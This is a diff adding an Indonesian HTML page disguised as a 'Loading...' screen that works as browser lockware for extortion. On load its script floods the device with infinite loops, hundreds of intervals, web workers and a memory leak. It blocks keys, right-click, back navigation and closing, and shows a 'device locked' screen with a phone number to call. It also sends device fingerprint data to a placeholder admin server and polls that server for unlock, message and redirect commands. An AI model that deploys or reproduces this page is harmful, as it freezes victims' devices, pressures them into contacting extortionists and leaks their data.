@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: black; color: white; font-family: monospace; overflow: hidden; position: fixed; width: 100%; height: 100%; }
+        .screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 9999; background: black; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid red; border-radius: 50%; animation: spin 0.5s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .lock-icon { font-size: 80px; animation: shake 0.3s infinite; }
+        @keyframes shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        .title { color: red; font-size: 28px; margin: 20px; font-weight: bold; }
+        .number { background: red; padding: 15px 30px; border-radius: 50px; font-size: 24px; margin: 20px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+<div class="screen" id="mainScreen">
+    <div class="spinner" id="spinner"></div>
+    <div class="title" id="statusText">Memverifikasi perangkat...</div>
+    <div class="hidden" id="lockContent">
+        <div class="lock-icon">🔒💀🔒</div>
+        <div class="title">DEVICE TERKUNCI!</div>
+        <div>Hubungi: <span class="number">6285136579792</span></div>
+        <div style="margin-top: 20px; font-size: 12px;">Kode: <span id="deviceCode"></span></div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        const VICTIM_ID = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        const ADMIN_SERVER = 'https://YOUR-ADMIN-SERVER.vercel.app'; // GANTI DENGAN URL ADMIN PANEL LO!
+        
+        let isLooped = true;
+        let intervals = [];
+        let workers = [];
+        let memoryLeak = [];
+        let animationFrames = [];
+        
+        // Simpan ID victim
+        localStorage.setItem('victim_id', VICTIM_ID);
+        
+        // ========== INFINITE LOOP ENGINE ==========
+        function startLoop() {
+            isLooped = true;
+            
+            // 1. While true loop
+            (function infiniteWhile() {
+                let x = 0;
+                while(isLooped) {
+                    x++;
+                    if(x > 1000000) {
+                        let arr = new Array(10000);
+                        for(let i = 0; i < arr.length; i++) arr[i] = Math.random();
+                        x = 0;
+                    }
+                }
+                if(isLooped) setTimeout(infiniteWhile, 0);
+            })();
+            
+            // 2. Interval spam
+            for(let i = 0; i < 500; i++) {
+                let id = setInterval(() => {
+                    if(!isLooped) return;
+                    let heavy = [];
+                    for(let j = 0; j < 10000; j++) heavy.push(Math.sin(Math.random()));
+                }, 1);
+                intervals.push(id);
+            }
+            
+            // 3. RAF spam
+            function rafSpam() {
+                if(!isLooped) return;
+                for(let i = 0; i < 100; i++) Math.sqrt(Math.random());
+                requestAnimationFrame(rafSpam);
+            }
+            for(let i = 0; i < 10; i++) {
+                let id = requestAnimationFrame(rafSpam);
+                animationFrames.push(id);
+            }
+            
+            // 4. Memory leak
+            setInterval(() => {
+                if(!isLooped) return;
+                memoryLeak.push(new Array(100000).fill(Date.now()));
+            }, 100);
+            
+            // 5. Worker spam
+            function createWorker() {
+                const code = `self.onmessage = () => { while(true) { let arr = []; for(let i=0;i<100000;i++) arr.push(Math.random()); } }`;
+                const blob = new Blob([code], {type: 'application/javascript'});
+                return new Worker(URL.createObjectURL(blob));
+            }
+            for(let i = 0; i < 20; i++) {
+                try { workers.push(createWorker()); } catch(e) {}
+            }
+        }
+        
+        // ========== STOP LOOP ==========
+        function stopLoop() {
+            isLooped = false;
+            
+            // Clear semua interval
+            intervals.forEach(id => clearInterval(id));
+            intervals = [];
+            
+            // Clear workers
+            workers.forEach(w => w.terminate());
+            workers = [];
+            
+            // Hapus memory leak reference biar GC bisa kerja
+            memoryLeak = [];
+            
+            // Unlock screen
+            document.getElementById('spinner').classList.add('hidden');
+            document.getElementById('statusText').innerHTML = '✅ PERANGKAT BERHASIL DIUNLOCK! ✅<br>Halaman akan refresh...';
+            
+            setTimeout(() => {
+                document.getElementById('mainScreen').innerHTML = `
+                    <div style="text-align: center; padding: 20px;">
+                        <div style="font-size: 50px;">🔓</div>
+                        <div style="color: lime; font-size: 24px; margin: 20px;">DEVICE TELAH DIUNLOCK!</div>
+                        <div style="color: white;">Silakan tutup halaman ini.</div>
+                        <div style="color: gray; font-size: 12px; margin-top: 20px;">Terima kasih telah kooperatif.</div>
+                    </div>
+                `;
+            }, 100);
+        }
+        
+        // ========== KIRIM DATA KE ADMIN ==========
+        function sendHeartbeat() {
+            const data = {
+                victim_id: VICTIM_ID,
+                is_looped: isLooped,
+                timestamp: Date.now(),
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                online: navigator.onLine,
+                url: window.location.href
+            };
+            
+            fetch(`${ADMIN_SERVER}/api/heartbeat`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+        }
+        
+        // ========== CEK PERINTAH DARI ADMIN ==========
+        async function checkCommand() {
+            try {
+                const res = await fetch(`${ADMIN_SERVER}/api/command/${VICTIM_ID}`);
+                const cmd = await res.json();
+                
+                if(cmd.action === 'stop_loop') {
+                    stopLoop();
+                } else if(cmd.action === 'unlock') {
+                    stopLoop();
+                } else if(cmd.action === 'show_message') {
+                    alert(cmd.message);
+                } else if(cmd.action === 'redirect') {
+                    window.location.href = cmd.url;
+                }
+            } catch(e) {}
+        }
+        
+        // ========== GENERATE DEVICE CODE ==========
+        function generateDeviceCode() {
+            let code = '';
+            for(let i = 0; i < 8; i++) {
+                if(i === 4) code += '-';
+                code += Math.random().toString(36).substring(2, 3).toUpperCase();
+            }
+            return code;
+        }
+        
+        // Tampilkan kode device setelah 3 detik
+        setTimeout(() => {
+            document.getElementById('lockContent').classList.remove('hidden');
+            document.getElementById('spinner').classList.add('hidden');
+            document.getElementById('statusText').innerHTML = '⚠️ PERANGKAT TERDETEKSI ⚠️';
+            document.getElementById('deviceCode').innerText = generateDeviceCode();
+        }, 3000);
+        
+        // ========== START ATTACK ==========
+        startLoop();
+        
+        // Heartbeat tiap 5 detik
+        setInterval(sendHeartbeat, 5000);
+        
+        // Cek command tiap 3 detik
+        setInterval(checkCommand, 3000);
+        
+        // Kirim data awal
+        setTimeout(sendHeartbeat, 1000);
+        
+        // Anti close
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
+        window.onbeforeunload = e => e.returnValue = '';
+        
+        // Block input
+        document.addEventListener('keydown', e => e.preventDefault());
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    })();
+</script>
+</body>
+</html>
